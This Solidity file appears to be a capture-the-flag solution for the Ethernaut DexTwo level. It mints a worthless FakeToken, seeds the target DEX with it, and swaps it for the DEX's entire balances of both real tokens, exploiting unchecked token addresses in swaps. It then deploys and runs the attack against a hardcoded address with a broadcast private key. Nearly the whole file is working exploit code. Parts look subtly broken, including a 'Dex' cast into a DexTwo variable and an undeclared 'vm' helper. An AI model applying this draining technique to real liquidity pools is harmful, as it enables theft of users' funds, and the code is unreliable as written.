// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/DexTwo.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract FakeToken is ERC20 {
    constructor() ERC20("FakeToken", "FAKE") {
        _mint(msg.sender, 1000);
    }
}

contract AttackDexTwo {
    DexTwo public dex;
    address public token1;
    address public token2;
    FakeToken public fake;

    constructor(DexTwo _dex) {
        dex = _dex;
        token1 = dex.token1();
        token2 = dex.token2();

        fake = new FakeToken();

        fake.transfer(address(dex), 1);
    }

    function attack() public {
        fake.approve(address(dex), type(uint256).max);

        dex.swap(address(fake), token1, 1);

        dex.swap(address(fake), token2, 2);
    }
}

contract DexTwoSolution {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        DexTwo dexTwoInstance = Dex(0x50C677101906d05bD64e0e8b923B93dBDAfC64D3);
        AttackDexTwo attacker = new AttackDexTwo(dexTwoInstance);
        attacker.attack();
        vm.stopBroadcast();
    }
}